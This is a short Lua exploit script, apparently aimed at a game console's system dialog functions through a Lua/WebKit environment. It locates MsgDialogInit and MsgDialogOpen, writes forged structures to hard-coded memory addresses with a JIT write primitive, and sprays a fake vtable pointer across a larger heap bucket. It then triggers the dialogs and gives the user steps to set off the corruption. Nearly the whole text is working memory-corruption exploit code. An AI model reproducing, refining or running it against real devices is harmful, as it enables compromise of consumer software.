--The Bug Code:

local function split64(val)
    local low = val % 0x100000000
    local high = math.floor(val / 0x100000000)
    return low, high
end

local function execute_bucket_shift()
    local report = "ORACLE: --- BUCKET SHIFTER (v151) ---\n"
    local msg_init, msg_open = nil, nil

    pcall(function()
        for k, v in pairs(_G) do
            if type(k) == "string" and type(v) == "function" then
                if string.match(k, "MsgDialogInit") then
                    msg_init = v
                elseif string.match(k, "MsgDialogOpen") then
                    msg_open = v
                end
            end
        end
    end)

    local init_anchor = 0x900A14000 + 0x40000
    local open_anchor = 0x900A14000 + 0x50000

    -- 1. THE BUCKET SHIFT (The Fix)
    -- Instead of 0x80 (128 bytes), we request 0x400 (1024 bytes).
    -- This moves us out of the WebKit bucket and into the Native System bucket.
    jit_write32(init_anchor, 0x00000400)
    local init_text_ptr = init_anchor + 64
    local i_low, i_high = split64(init_text_ptr)
    jit_write32(init_anchor + 8, i_low)
    jit_write32(init_anchor + 12, i_high)

    -- 2. THE CORRUPTED STRUCT
    jit_write32(open_anchor, 0xFFFFFFFF)
    local open_payload_ptr = open_anchor + 64
    local o_low, o_high = split64(open_payload_ptr)
    jit_write32(open_anchor + 8, o_low)
    jit_write32(open_anchor + 12, o_high)

    -- 3. THE NATIVE VTABLE SPRAY
    -- We spray the fake execution pointer across the larger bucket space.
    for offset = 0, 0x4000, 8 do
        jit_write32(open_payload_ptr + offset, 0x41414141) -- Low
        jit_write32(open_payload_ptr + offset + 4, 0x41414141) -- High
    end

    report = report .. "[!] Shifted to 1024-Byte Bucket. VTable Spray Armed.\n"

    -- THE HANDSHAKE
    pcall(msg_init, init_anchor)
    local delay = 0
    while delay < 500000 do
        delay = delay + 1
    end
    pcall(msg_open, open_anchor)

    report = report .. "\n[*] STRIKE DELIVERED.\n"
    report = report .. "[!] ACTION REQUIRED:\n"
    report = report .. "1. Close this screen.\n"
    report = report .. "2. Press the PS Button to open the Quick Menu.\n"
    report = report .. "3. Go to the home screen then select options on any app ,(you may need to run it many times)"

    error(report)
end

execute_bucket_shift()
